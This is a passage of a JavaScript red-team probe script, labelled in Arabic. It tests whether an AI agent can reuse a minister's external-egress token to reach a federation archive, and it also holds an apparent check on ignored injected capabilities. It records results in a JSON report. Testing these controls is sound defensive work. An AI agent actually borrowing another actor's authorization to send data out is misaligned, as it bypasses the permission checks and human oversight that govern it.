      refusal: 'src/identity/identity-gate.mjs:verify استبدلت القدرات من السجل',
      extra: { ok: verdict.ok, injectedIgnored: injected.length },
    };
  },
);

await probe('ISO-08', 'عزل الوكلاء', 'تواطؤ: وكيل يستهلك تذكرة وزير بعد صدورها', async () => {
  const log = memoryLog();
  const point = enforcement(log);
  const issued = await point.authorize({
    actor: minister(),
    action: 'external-egress',
    resource: { type: 'data', id: 'federation:archive' },
    context: { destination: 'federation:archive' },
  });
  if (!issued.decision.allowed || issued.token === null) {
    return {
      judgment: 'لم_يجرب',
      note: `لم تصدر تذكرة خروج للوزير: ${issued.decision.code}`,
      extra: { code: issued.decision.code },
    };
  }
  try {
    point.verify(issued.token, {
      actorId: agentActor().id,
      action: 'external-egress',
      resourceKey: 'data:federation:archive',
    });
    return { judgment: 'نجح', note: 'وكيل استهلك تذكرة خروج وزير' };
  } catch (error) {
    return {
      judgment: 'فشل',
      refusal: `src/policy/enforcement-point.mjs:verify:${codeOf(error)}`,
      extra: { code: codeOf(error) },
    };
  }
});

fs.writeFileSync(
  OUT,
  JSON.stringify(
    {
      generatedAt: new Date().toISOString(),
      reviewTree: ROOT,
      counts: {
        total: results.length,
        نجح: results.filter((r) => r.judgment === 'نجح').length,
        فشل: results.filter((r) => r.judgment === 'فشل').length,
        لم_يجرب: results.filter((r) => r.judgment === 'لم_يجرب').length,
      },
      results,
    },
    null,
    2,
  ) + '\n',
);

const summary = results
  .map((r) => `${r.id}\t${r.judgment}\t${r.refusal ?? r.note ?? ''}`)
  .join('\n');
process.stdout.write(`${summary}\nWROTE ${OUT}\n`);
process.exitCode = 0;
